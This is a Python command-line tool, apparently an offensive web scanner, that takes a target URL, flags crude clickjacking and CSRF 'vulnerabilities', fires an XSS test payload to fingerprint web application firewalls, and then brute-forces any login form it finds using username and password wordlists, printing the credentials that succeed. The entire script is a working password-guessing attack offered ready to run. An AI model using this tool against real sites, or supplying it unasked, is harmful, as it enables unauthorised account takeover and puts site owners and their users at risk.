#!/usr/bin/env python3
# Modules
import mechanize
import itertools
import http.cookiejar as cookielib
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib.request import urlopen, URLError

# Stuff related to Mechanize browser module
br = mechanize.Browser()  # Shortening the call by assigning it to a variable "br"

# Set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)

# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [
    ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
    ('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), 
    ('Accept-Encoding', 'br')
]

# Banner
print('''
\033[1;93m
 ____  _ _____ _
/ ___|(_)_   _| |__  _   _
\___ \| | | | | '_ \| | | |
 ___) | | | | | | | | |_| |
|____/|_| |_| |_| |_|\__,_|
\033[1;34m
''')

url = input('\033[1;34m[?]\033[0m Enter target URL: ')  # Takes input from user
if not url.startswith(('http://', 'https://')):
    url = 'http://' + url

try:
    br.open(url, timeout=10.0)  # Opens the URL
except URLError:
    url = 'https://' + url
    br.open(url)

forms = list(br.forms())  # Finds all the forms present on webpage
headers = str(urlopen(url).headers).lower()  # Fetches headers of webpage

if 'x-frame-options:' not in headers:
    print('\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability')
if 'cloudflare-nginx' in headers:
    print('\033[1;31m[-]\033[0m Target is protected by Cloudflare')

data = br.open(url).read().decode('utf-8')  # Reads the response
if 'type="hidden"' not in data:
    print('\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability')

soup = BeautifulSoup(data, 'html.parser')  # Parses the response with BeautifulSoup
i_title = soup.find('title')  # Finds the title tag
original = i_title.get_text() if i_title else None  # Gets value of title tag

def WAF_detector():  # WAF detection function
    noise = "?=<script>alert()</script>"  # A payload to provoke the WAF
    fuzz = url + noise
    try:
        res1 = urlopen(fuzz)
        if res1.code in [406, 501]:  # HTTP response codes for Mod_Security
            print("\033[1;31m[-]\033[1;m WAF Detected : Mod_Security")
        elif res1.code == 999:
            print("\033[1;31m[-]\033[1;m WAF Detected : WebKnight")
        elif res1.code == 419:
            print("\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP")
        elif res1.code == 403:
            print("\033[1;31m[-]\033[1;m Unknown WAF Detected")
    except URLError:
        print("Error during WAF detection.")

WAF_detector()

def wordlist_u(lst):
    try:
        with open('usernames.txt', 'r') as f:
            lst.extend(line.strip() for line in f)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        sys.exit()

def wordlist_p(lst):
    try:
        with open('passwords.txt', 'r') as f:
            lst.extend(line.strip() for line in f)
    except IOError:
        print("\033[1;31m[-]\033[1;m Wordlist not found!")
        sys.exit()

usernames = []
wordlist_u(usernames)
print('\033[1;97m[>]\033[1;m Usernames loaded:', len(usernames))

passwords = []
wordlist_p(passwords)
print('\033[1;97m[>]\033[1;m Passwords loaded:', len(passwords))

def find():  # Function for finding forms
    form_number = 0
    for f in forms:  # Finds all the forms in the webpage
        data = str(f)  # Converts the response received to string
        username = search(r'<TextControl\([^<]*=\)>', data)  # Searches for fields that accept plain text

        if username:
            username = username.group().split('<TextControl(')[1][:-3]
            print('\033[1;33m[!]\033[0m Username field:', username)
            passwd = search(r'<PasswordControl\([^<]*=\)>', data)

            if passwd:
                passwd = passwd.group().split('<PasswordControl(')[1][:-3]
                print('\033[1;33m[!]\033[0m Password field:', passwd)
                menu, option, name = "False", "", ""
                brute(username, passwd, menu, option, name, form_number)
            form_number += 1
    print('\033[1;31m[-]\033[0m No forms found')

def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print('\033[1;97m[>]\033[1;m Bruteforcing username:', uname)
        for password in passwords:
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i' % (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == "True":
                br.form[name] = [option]
            resp = br.submit()
            data = resp.read().decode('utf-8')
            if 'username or password' not in data.lower():
                print('\n\033[1;32m[+]\033[0m Valid credentials found:')
                print('\033[1;32mUsername:\033[0m', uname)
                print('\033[1;32mPassword:\033[0m', password)
                sys.exit()
            progress += 1
        print('')
    print('\033[1;31m[-]\033[0m Failed to crack login credentials')

find()
    
